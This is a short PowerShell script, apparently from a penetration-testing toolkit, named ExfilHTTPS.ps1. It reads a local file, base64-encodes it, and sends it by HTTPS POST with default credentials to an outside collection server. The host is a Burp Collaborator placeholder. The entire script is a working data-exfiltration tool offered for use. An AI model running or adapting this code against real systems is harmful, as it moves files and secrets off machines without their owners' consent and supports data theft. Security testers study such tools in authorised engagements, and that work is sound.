# ExfilHTTPS.ps1 by @xer0dayz - https://xerosecurity.com
#
# This script will exfil the entire contents of a file via base64 encoded strings via HTTPS POST request to custom web server.
#

$content = Get-Content exfil.txt
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
$EncodedText =[Convert]::ToBase64String($Bytes)
$uri = "https://yourhost.burpcollaborator.net"
Invoke-RestMethod -Uri $uri -Body $content -UseDefaultCredentials -Method Post -ContentType "multipart/form-data"
#Invoke-RestMethod -Uri $uri -Body $EncodedText -UseDefaultCredentials -Method Post -ContentType "multipart/form-data"